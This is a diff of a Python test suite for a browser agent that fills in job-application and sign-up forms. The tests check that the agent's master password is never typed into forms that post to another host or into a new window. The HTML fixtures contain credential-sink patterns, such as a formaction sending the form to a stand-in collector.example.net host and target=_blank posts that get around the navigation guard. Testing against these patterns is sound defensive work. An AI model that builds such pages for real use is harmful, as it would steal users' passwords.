@@ -939,22 +939,21 @@ def test_off_host_subresources_on_the_sign_in_click_do_not_park_the_job(
     assert "State: login_wall" in record
 
 
-def test_a_signup_that_parks_off_host_still_records_the_account(
+def test_a_signup_whose_form_posts_off_host_parks_before_anything_is_typed(
         context, fixture_url, job_folder, catalog_builder, tmp_path, monkeypatch):
-    """The create-account click landed, so the account may already exist; the
-    ledger has to say so or the next run signs up again with the same email."""
+    """The sign-up form's action is another host (a credential sink): the
+    password is never typed and the button never clicked, so no account was
+    made and the ledger records none."""
     monkeypatch.setattr(ats_accounts, "_get_master_password", lambda: "synthetic-password")
+    typed = _count_password_fills(monkeypatch)
     _enqueue(job_folder, fixture_url("signup_cross_host.html"))
     out = _runner(context, tmp_path).drain(cap=1)[0]
     assert out.status == "needs_human", out
-    assert "left the allowed sites: localhost" in out.reason
-    assert ats_accounts.lookup("127.0.0.1")["email"] == "jane.doe@example.com"
-    # the aborted navigation leaves the tab on a browser error page; the note
-    # names the page the human has to come back to
-    tab_note = _entry()["tab_note"]
-    assert tab_note.startswith(fixture_url("signup_cross_host.html")), tab_note
-    assert "chrome-error" not in tab_note
-    assert "Create an account - Synthetic Careers" in tab_note
+    assert out.reason.startswith(
+        "the account form posts to localhost, outside the application site"), out.reason
+    assert typed == []
+    assert ats_accounts.lookup("127.0.0.1") is None
+    assert _entry()["tab_note"] == "log in manually, then Re-queue"
 
 
 def test_default_accounts_block_cross_host_credential_request_before_it_reaches_server(
@@ -1698,17 +1697,19 @@ def test_a_form_after_an_account_pages_submit_waits_for_the_user(
 def test_a_submit_the_guard_stopped_sent_nothing_and_parks(
         context, job_folder, catalog_builder, tmp_path, monkeypatch):
     # the submit button's own formaction posts off the sites and the guard
-    # stops the post: nothing was sent, so the job parks
+    # stops the post: nothing was sent, so the job parks. (The password box
+    # sits outside that form: inside it, the password is never typed at all,
+    # `test_the_master_password_goes_only_into_a_password_input_on_the_application_site`.)
     _count_password_fills(monkeypatch)
     hits = []
     context.route("https://collector.example.net/**",
                   lambda route: hits.append(1) or route.fulfill(body="taken"))
     _serve_combined(context, "", resume=True, html="""<!doctype html><html><body>
+      <label>Password * <input type="password" name="pw" autocomplete="new-password"
+        required></label>
       <form method="post">
         <label>First name * <input name="first" required></label>
         __RESUME__
-        <label>Password * <input type="password" name="pw" autocomplete="new-password"
-          required></label>
         <button formaction="https://collector.example.net/take">Submit application</button>
       </form></body></html>""")
     _enqueue(job_folder, _COMBINED_URL)
@@ -1847,7 +1848,21 @@ def _routed_unit_run(context, tmp_path, job_folder, html, **settings):
     # LinkedIn may load in the tab and never takes the password
     ('<form action="https://www.linkedin.com/take" method="post"><label>Password '
      '<input type="password" name="pw" required></label><button>Next</button></form>', "site",
-     "the password box's form posts to www.linkedin.com, outside the allowed sites")])
+     "the password box's form posts to www.linkedin.com, outside the allowed sites"),
+    # a submit button's own formaction posts the form elsewhere
+    ('<form method="post"><label>Password <input type="password" name="pw" required></label>'
+     '<button formaction="https://collector.example.net/take">Next</button></form>', "site",
+     "the password box's form posts to collector.example.net, outside the allowed sites"),
+    # a post into another window is one the navigation guard never sees
+    ('<form method="post" target="_blank"><label>Password '
+     '<input type="password" name="pw" required></label><button>Next</button></form>', "site",
+     "the password box's form sends it into a new window"),
+    ('<form method="post"><label>Password <input type="password" name="pw" required></label>'
+     '<button formtarget="_blank">Next</button></form>', "site",
+     "the password box's form sends it into a new window"),
+    ('<base target="_blank"><form method="post"><label>Password '
+     '<input type="password" name="pw" required></label><button>Next</button></form>', "site",
+     "the password box's form sends it into a new window")])
 def test_the_master_password_goes_only_into_a_password_input_on_the_application_site(
         context, job_folder, catalog_builder, tmp_path, monkeypatch, html, where, reason):
     typed = _count_password_fills(monkeypatch)
